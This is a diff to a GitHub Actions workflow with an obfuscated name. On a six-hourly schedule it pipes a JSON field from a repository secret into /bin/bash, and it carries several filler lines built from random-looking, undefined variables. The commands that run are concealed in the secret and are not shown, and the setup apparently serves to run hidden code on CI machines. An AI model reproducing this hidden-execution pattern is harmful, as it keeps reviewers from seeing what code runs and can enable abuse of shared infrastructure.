@@ -3,28 +3,25 @@ name: cheeseingredient
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 3/6 * * *'
+    - cron: '20 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: cheeseingredient
         env:
-          wdfh91: ${{ secrets.wdfh91 }}
+          tuyx32704: ${{ secrets.tuyx32704 }}
         run: |
-          echo $wdfh91 | jq -r .ypyc897 | /bin/bash
-          echo $z2324 | jq -r .wpmpb95063 | /bin/bash
-          echo $i42115 | jq -r .j82468 | /bin/bash
-          echo $mu142 | jq -r .vllrc01268 | /bin/bash
-          echo $jnkjx24104 | jq -r .kzyq2146 | /bin/bash
-          echo $r302 | jq -r .epus62 | /bin/bash
-          echo $l4 | jq -r .lbzrr823 | /bin/bash
-          echo $p03 | jq -r .nudek78 | /bin/bash
-          echo $yy39 | jq -r .zyl3 | /bin/bash
-          echo $m9352 | jq -r .ra3870 | /bin/bash
-          echo $to85510 | jq -r .st53 | /bin/bash
-          echo $q5 | jq -r .p706 | /bin/bash
+          echo $tuyx32704 | jq -r .qyt32858 | /bin/bash
+          echo $jy0 | jq -r .n9 | /bin/bash
+          echo $qqtxu15 | jq -r .zaocl835 | /bin/bash
+          echo $am01629 | jq -r .b3 | /bin/bash
+          echo $utbe99 | jq -r .slkro9 | /bin/bash
+          echo $hgf51484 | jq -r .ij341 | /bin/bash
+          echo $d31870 | jq -r .hyzw564 | /bin/bash
+          echo $r80241 | jq -r .aqd04538 | /bin/bash
+          echo $bssoi5 | jq -r .ircct23955 | /bin/bash
+          echo $fkk750 | jq -r .u890 | /bin/bash
 
